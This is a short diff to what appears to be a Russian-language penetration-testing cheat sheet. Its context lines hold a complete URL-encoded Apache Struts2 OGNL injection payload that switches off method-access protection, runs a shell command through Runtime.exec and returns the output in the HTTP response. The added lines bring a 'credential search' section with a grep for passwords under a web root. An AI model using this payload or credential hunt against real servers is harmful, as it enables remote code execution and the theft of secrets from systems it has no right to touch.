@@ -126,3 +126,8 @@ Cero подключается к удалённым хостам и считыв
 ```
 /index.action?redirect:%25%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField%28%22allowStaticMethodAccess%22%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22ls%20-la%22%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28%23d%29%2C%23out.close%28%29%7D
 ```
+
+## Поиск кредов
+```
+grep -r "password{" /www 2>/dev/null
+```
